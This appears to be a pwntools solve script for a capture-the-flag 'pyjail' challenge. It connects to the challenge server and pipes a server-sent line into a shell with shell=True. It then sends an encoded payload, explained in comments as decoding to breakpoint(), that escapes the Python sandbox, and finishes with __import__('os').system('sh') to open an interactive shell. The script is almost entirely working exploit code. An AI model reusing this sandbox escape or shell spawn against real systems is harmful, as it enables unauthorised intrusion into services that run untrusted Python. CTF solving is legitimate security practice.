from pwn import *
from subprocess import check_output


#p = remote('localhost', 5000)
p = remote('challs2.pyjail.club', 20194)

p.recvline()
p.sendline(check_output(p.recvline(),shell=True).strip())

#p.sendline(b'989224 8592 10781 11104 8249 323 339 326 322 332 337 336 330 335 341 265 266 8250 7437 1015389 7437 120498 120120 984133 9974 10753 1014847 1014847 1014850 7437 1015389')
p.sendline(b'5171 5171 5171 8249 10302 10908 9797 10403 4646 11716 12120 11716 8250 1015389 988284 8249 10404 11016 9894 10506 4692 11832 12240 11832 8250 1015389 43007 1094722 5176 60326 119910 5176 60326 119872 5176 60326 60989 8594 9790')

# explanation
# 989224 8592 - dump everything that follows this into eval or exec or smth (see meta.☾ file)
# 10781 11104 - ''.join everything that follows
# 8249 323 339 326 322 332 337 336 330 335 341 265 266 8250 - payload encoded with all chrs have ord(c)+225
# 7437 1015389 - map ord() to all chars in string (1015389 does chr/ord toggle depending on input)
# 7437 120498 120120 984133 9974 10753 1014847 1014847 1014850 - equivalent of map(lambda *a: sum([a[0]]+[-225]), inp_array)
# 7437 1015389 - map chr() to all chars in string (1015389 does chr/ord toggle depending on input)

# python equiv: eval(''.join(map(chr, map(lambda *a: sum([a[0]]+[-225]), map(ord, 'ŃœņłŌőŐŊŏŕĉĊ')))))
# decoded inner payload is simply breakpoint()

print('loading')
p.recvuntil('loaded')

p.sendline(b'__import__("os").system("sh")')
print('u have shell now')

p.interactive()

